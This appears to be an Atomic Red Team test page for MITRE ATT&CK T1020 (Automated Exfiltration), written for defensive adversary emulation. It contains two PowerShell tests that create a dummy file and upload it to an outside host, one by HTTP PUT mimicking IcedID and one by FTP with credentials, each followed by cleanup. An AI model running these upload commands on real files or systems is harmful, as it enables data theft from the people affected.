# T1020 - Automated Exfiltration

## Atomic Tests

- [Atomic Test #1 - IcedID Botnet HTTP PUT](#atomic-test-1---icedid-botnet-http-put)

- [Atomic Test #2 - Exfiltration via Encrypted FTP](#atomic-test-2---exfiltration-via-encrypted-ftp)

### Atomic Test #1 - IcedID Botnet HTTP PUT
Creates a text file
Tries to upload to a server via HTTP PUT method with ContentType Header
Deletes a created file

**Supported Platforms:** windows

#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| file | Exfiltration File | string | C:\temp\T1020_exfilFile.txt|
| domain | Destination Domain | url | https://google.com|

#### Attack Commands: Run with `powershell`!

```powershell
$fileName = "#{file}"
$url = "#{domain}"
$file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil Test"
$contentType = "application/octet-stream"
try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}
```

#### Cleanup Commands:
```powershell
$fileName = "#{file}"
Remove-Item -Path $fileName -ErrorAction Ignore
```

### Atomic Test #2 - Exfiltration via Encrypted FTP
Simulates encrypted file transfer to an FTP server. For testing purposes, a free FTP testing portal is available at https://sftpcloud.io/tools/free-ftp-server, providing a temporary FTP server for 60 minutes. Use this service responsibly for testing and validation only.

**Supported Platforms:** windows

#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| sampleFile | Path of the sample file to exfiltrate. | String | C:\temp\T1020__FTP_sample.txt|
| ftpServer | FTP server URL. | Url | ftp://example.com|
| credentials | FTP server credentials. | String | [user:password]|

#### Attack Commands: Run with `powershell`!

```powershell
$sampleData = "Sample data for exfiltration test"
Set-Content -Path "#{sampleFile}" -Value $sampleData
$ftpUrl = "#{ftpServer}"
$creds = Get-Credential -Credential "#{credentials}"
Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile "#{sampleFile}" -Credential $creds
```

#### Cleanup Commands:
```powershell
Remove-Item -Path "#{sampleFile}" -ErrorAction Ignore
```

**Elevation Required:** No
